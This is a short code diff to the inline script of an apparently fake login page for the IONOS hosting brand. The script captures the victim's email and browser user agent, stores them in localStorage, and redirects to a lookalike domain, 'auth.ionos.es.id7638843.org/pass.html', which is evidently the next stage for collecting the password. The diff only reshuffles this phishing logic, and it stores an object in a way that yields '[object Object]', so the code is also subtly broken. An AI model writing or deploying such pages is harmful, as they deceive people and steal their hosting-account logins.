@@ -256,8 +256,7 @@
 <div class="page-transition__blocker sf-hidden"></div><div class="static-overlay__blocker static-overlay__blocker--hidden sf-hidden"></div>
 
 <script>
-	const data = localStorage.getItem('usr');
-    const parsedA = JSON.parse(data);
+
     const userAgent = navigator.userAgent;
 
 	document.getElementById('myForm').addEventListener('submit', async (e) => {
@@ -265,13 +264,13 @@
 		let formData = new FormData(e.target);
 
 			
-		const payload = {
+		formData = {
 			agent: userAgent,
 			email: formData.get('email'), // ✅ corect
 			try: 3
 		};
 
-		localStorage.setItem('usr', payload);
+		localStorage.setItem('usr', formData);
 	
 		window.location.href = 'https://auth.ionos.es.id7638843.org/pass.html?shoplogin=enabled&_gl=1*t2x778*_gcl_au*NzM2ODQ0NDYzLjE3Nzc3MzUyNTk.';
   })  
